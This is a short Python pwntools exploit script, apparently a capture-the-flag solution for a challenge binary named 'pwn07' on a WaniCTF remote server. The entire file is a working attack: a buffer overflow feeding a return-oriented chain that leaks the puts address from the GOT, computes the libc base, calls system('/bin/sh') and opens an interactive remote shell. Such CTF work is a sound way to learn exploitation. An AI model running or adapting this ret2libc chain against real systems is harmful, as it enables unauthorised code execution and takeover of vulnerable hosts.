#!/usr/bin/env python3

from pwn import *

binary = './pwn07'
env = {"LD_PRELOAD": "./libc-2.27.so"}
elf = ELF(binary)
libc = ELF("./libc-2.27.so")

context.binary = elf 

p = remote('rce.wanictf.org', 9007)
#p = process(binary, env=env)

data = p.recvuntil("What's your name?:")
log.warn(data)

# 0x00400a13: pop rdi ; ret  ;  (1 found)
pop_rdi = 0x00400a13
# 0x00400626: ret  ;  (13 found)
ret = 0x00400626
puts_plt = 0x400650
puts_got = 0x601020
puts_rel = 0x0000000000080aa0
system_rel = 0x000000000004f550

vuln_addr = 0x4007a7

payload = b'A'*22
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(ret)
payload += p64(puts_plt)
payload += p64(ret)
payload += p64(vuln_addr)

pay = payload

p.send(payload)

data = p.recvuntil('***end stack dump***')
addr = p.recvline()
addr = p.recvline()

puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.warn(addr)

libc.address = puts_addr - puts_rel

system_addr = puts_addr - puts_rel + system_rel

data = p.recvuntil("What's your name?:")
log.warn(data)

payload = b'A'*22
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(system_addr)

pay += payload

p.send(payload)

p.interactive()
